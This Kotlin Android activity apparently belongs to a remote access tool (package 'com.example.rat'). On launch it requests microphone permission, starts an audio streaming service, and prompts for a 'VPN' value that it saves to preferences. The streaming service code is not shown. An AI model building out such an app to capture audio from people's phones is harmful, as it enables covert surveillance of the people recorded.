package com.example.rat

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import com.example.rat.ui.theme.RatTheme
import java.util.UUID

class MainActivity : ComponentActivity() {

    private val requestPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) {
                startStreamingService()
            } else {
                // Обработка отказа в разрешении.
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
            startStreamingService()
        } else {
            requestPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
        }

        setContent {
            RatTheme {
                MainScreen(
                    onVpnEntered = { vpn ->
                        saveVpn(vpn)
                        Log.d("VPN Input", "VPN успешно сохранен: $vpn") // Логирование успешного ввода VPN
                    }
                )
            }
        }
    }

    private fun startStreamingService() {
        val serviceIntent = Intent(this, AudioStreamingService::class.java)
        startForegroundService(serviceIntent)
    }

    // Функция для сохранения VPN в Shared Preferences
    private fun saveVpn(vpn: String) {
        val sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        with(sharedPreferences.edit()) {
            putString("VPN_KEY", vpn)
            apply()
        }
    }
}

@Composable
fun MainScreen(onVpnEntered: (String) -> Unit) {
    var vpnInput by remember { mutableStateOf("") }
    var showDialog by remember { mutableStateOf(true) } // Показать диалог сразу

    if (showDialog) {
        VpnInputDialog(
            onDismiss = { showDialog = false },
            onSaveVpn = { vpn ->
                onVpnEntered(vpn) // Вызываем функцию для обработки введенного VPN
                showDialog = false
            }
        )
    }
}

@Composable
fun VpnInputDialog(onDismiss: () -> Unit, onSaveVpn: (String) -> Unit) {
    var vpnInput by remember { mutableStateOf("") }

    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Введите VPN") },
        text = {
            TextField(
                value = vpnInput,
                onValueChange = { vpnInput = it },
                label = { Text("VPN") },
                modifier = Modifier.fillMaxWidth()
            )
        },
        confirmButton = {
            Button(onClick = {
                onSaveVpn(vpnInput)
            }) {
                Text("Сохранить")
            }
        },
        dismissButton = {
            Button(onClick = onDismiss) {
                Text("Отмена")
            }
        }
    )
}

@Preview(showBackground = true)
@Composable
fun MainScreenPreview() {
    RatTheme {
        MainScreen(onVpnEntered = {})
    }
}